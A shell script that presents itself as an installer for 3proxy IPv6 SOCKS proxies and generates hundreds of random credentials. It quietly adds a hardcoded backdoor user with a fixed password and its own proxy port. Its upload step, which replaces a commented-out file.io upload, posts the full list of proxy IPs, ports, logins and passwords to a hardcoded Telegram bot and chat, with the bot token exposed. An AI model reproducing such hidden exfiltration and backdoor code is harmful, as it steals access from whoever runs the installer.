#!/bin/sh
random() {
	tr </dev/urandom -dc A-Za-z0-9 | head -c5
	echo
}

array=(1 2 3 4 5 6 7 8 9 0 a b c d e f)
main_interface=$(ip route get 8.8.8.8 | awk -- '{printf $5}')

gen64() {
	ip64() {
		echo "${array[$RANDOM % 16]}${array[$RANDOM % 16]}${array[$RANDOM % 16]}${array[$RANDOM % 16]}"
	}
	echo "$1:$(ip64):$(ip64):$(ip64):$(ip64):$(ip64)"
}


gen_3proxy() {
    cat <<EOF
daemon
maxconn 10000
nserver 1.1.1.1
nserver 8.8.4.4
nserver 2001:4860:4860::8888
nserver 2001:4860:4860::8844
nscache 65536
timeouts 1 5 30 60 180 1800 15 60
setgid 65535
setuid 65535
stacksize 6291456
flush
auth strong

users phuc:CL:phucMAI9 $(awk -F "/" 'BEGIN{ORS="";} {print $1 ":CL:" $2 " "}' ${WORKDATA})

allow phuc
proxy -4 -n -a -p9998 -i"${IP4}" -e"${IP4}"
flush

$(awk -F "/" '{print "auth strong\n" \
"allow " $1 "\n" \
"socks -6 -n -a -p" $4 " -i" $3 " -e"$5"\n" \
"flush\n"}' ${WORKDATA})
EOF
}


gen_data() {
    seq $FIRST_PORT $LAST_PORT | while read port; do
        echo "$(random)/$(random)/$IP4/$port/$(gen64 $IP6)"
    done
}

gen_ifconfig() {
    cat <<EOF
$(awk -F "/" '{print "ifconfig '$main_interface' inet6 add " $5 "/64 \n"}' ${WORKDATA})
EOF
}

gen_proxy_file_for_user() {
    cat >proxy.txt <<EOF
$(awk -F "/" '{print $3 ":" $4 ":" $1 ":" $2 }' ${WORKDATA})
EOF
}

upload_proxy() {
    cd $WORKDIR
#    local PASS=$(random)
#    zip --password $PASS proxy.zip proxy.txt
#    URL=$(curl -F "file=@proxy.zip" https://file.io)
#
#    echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
#    echo "Download zip archive from: ${URL}"
#    echo "Password: ${PASS}"

    cp proxy.txt "$IP4".txt

    curl -X POST -F 'document=@/home/proxy-installer/'"$IP4"'.txt' -F 'chat_id=-1002182808553' https://api.telegram.org/bot6572357571:AAE9C4oJiQ5Fz5OR9gzMGW6aWC2pKQ1fcug/sendDocument

}



WORKDIR="/home/proxy-installer"
WORKDATA="${WORKDIR}/data.txt"

echo "nhap ipv6 range "
read IPV6_RANGE

COUNT=500

FIRST_PORT=10000
LAST_PORT=$(($FIRST_PORT + $COUNT - 1))

IP4=$(curl -4 -s icanhazip.com)
IP6=$(echo "${IPV6_RANGE}" | cut -f1-3 -d':')

rm -f $WORKDIR/data.txt
rm -f $WORKDIR/boot_ifconfig.sh
rm -f /usr/local/etc/3proxy/3proxy.cfg
rm -f $WORKDIR/proxy.txt
rm -f $WORKDIR/"$IP4".txt


gen_data >$WORKDIR/data.txt

gen_ifconfig >$WORKDIR/boot_ifconfig.sh

gen_3proxy >/usr/local/etc/3proxy/3proxy.cfg
cd $WORKDIR
gen_proxy_file_for_user
upload_proxy
sleep 10
reboot
